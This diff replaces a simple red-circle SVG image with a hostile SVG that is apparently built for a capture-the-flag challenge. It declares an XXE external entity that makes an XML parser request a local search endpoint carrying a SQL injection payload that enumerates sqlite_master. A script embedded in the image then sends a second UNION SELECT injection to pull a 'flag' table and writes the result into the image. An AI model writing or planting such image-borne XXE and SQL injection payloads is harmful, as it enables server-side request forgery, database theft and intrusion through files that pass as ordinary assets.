@@ -1,1 +1,29 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" /></svg>
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+<!ENTITY % remote SYSTEM "http://localhost:8001/search?q=%27%20UNION%20SELECT%20tbl_name,name%20FROM%20sqlite_master%20--">
+<!ENTITY % trigger "%remote;">
+%trigger;
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="200">
+  <rect width="100%" height="100%" fill="white"/>
+  <text x="20" y="40" font-size="14">
+    XXE Attack Status:
+  </text>
+  <text x="20" y="70" font-size="12">
+    <!-- This will show if entity resolution fails -->
+    Server response: <?xml-stylesheet type="text/xml" href="#"?>
+  </text>
+  <script><![CDATA[
+    // Fallback JavaScript attack
+    setTimeout(async () => {
+      try {
+        const payload = "%27 UNION SELECT flag,1 FROM flag --";
+        const res = await fetch(`http://localhost:8001/search?q=${encodeURIComponent(payload)}`);
+        const data = await res.text();
+        document.querySelector('text').textContent += `\n\nJS Response: ${data.slice(0, 50)}`;
+      } catch(e) {
+        document.querySelector('text').textContent += "\nJS Error: " + e.message;
+      }
+    }, 1500);
+  ]]></script>
+</svg>
